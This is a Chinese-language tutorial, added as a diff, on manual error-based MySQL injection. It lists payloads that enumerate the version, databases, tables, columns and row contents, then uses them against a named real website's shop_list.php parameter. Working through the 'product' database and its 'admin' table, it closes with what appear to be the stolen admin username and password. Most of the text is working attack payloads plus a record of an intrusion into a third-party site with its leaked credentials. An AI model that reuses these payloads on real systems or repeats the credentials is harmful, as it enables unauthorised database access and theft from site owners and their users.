@@ -1,0 +1,54 @@
+
+                     mysql手工注入之高级报错注入
+
+
+
+作者:dark'moon QQ:40497992
+查看版本mysql版本
+and+exists(select*from+(select*from(select+name_const(@@version,0))a+join+(select+name_const(@@version,0))b)c) 
+
+爆所有库
+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,0x27,schema_name,0x27,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1
+
+爆当前数据库
+and(select 1 from(select count(*),concat((select (select concat(0x7e,0x27,hex(cast(database() as char)),0x27,0x7e)) from
+information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1
+
+爆表
+and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0x27,hex(cast(table_name as char)),0x27,0x7e) from information_schema.tables where table_schema=hex库名 limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1
+
+
+爆字段
+and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0x27,column_name,0x27,0x7e) from information_schema.columns where table_schema=库名 and table_name=表名 limit 0,1)) from
+information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1
+
+爆内容
+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,0x27,表名.字段,0x27,0x7e) from 表名 limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1
+
+演示站点
+http://huiyuan.zzit.com.cn/company/shop_list.php?nid=60
+
+
+
+http://huiyuan.zzit.com.cn/company/shop_list.php?nid=60 and+exists(select*from+(select*from(select+name_const(@@version,0))a+join+(select+name_const(@@version,0))b)c) 
+
+http://huiyuan.zzit.com.cn/company/shop_list.php?nid=60 and(select 1 from(select count(*),concat((select (select concat(0x7e,0x27,hex(cast(database() as char)),0x27,0x7e)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1
+0x70726F64756374
+
+and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0x27,hex(cast(table_name as char)),0x27,0x7e) from information_schema.tables where table_schema=0x70726F64756374 limit 1,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1
+
+http://huiyuan.zzit.com.cn/company/shop_list.php?nid=60%20and(select%201%20from(select%20count(*),concat((select%20(select%20(select%20distinct%20concat(0x7e,0x27,hex(cast(table_name%20as%20char)),0x27,0x7e)%20from%20information_schema.tables%20where%20table_schema=0x70726F64756374%20limit%200,1))%20from%20information_schema.tables%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%20and%201=1
+0x61646D696E admin
+
+and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0x27,column_name,0x27,0x7e) from information_schema.columns where table_schema=0x70726F64756374 and table_name=0x61646D696E limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1
+
+http://huiyuan.zzit.com.cn/company/shop_list.php?nid=60 and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0x27,column_name,0x27,0x7e) from information_schema.columns where table_schema=0x70726F64756374 and table_name=0x61646D696E limit 3,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1
+
+id username password
+
+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,0x27,admin.username,0x27,0x7e) from admin limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1
+
+http://huiyuan.zzit.com.cn/company/shop_list.php?nid=60%20and(select%201%20from(select%20count(*),concat((select%20(select%20(select%20concat(0x7e,0x27,admin.password,0x27,0x7e)%20from%20admin%20limit%200,1))%20from%20information_schema.tables%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%20and%201=1
+baojia zyggvszzit
+
+zyggvszzit
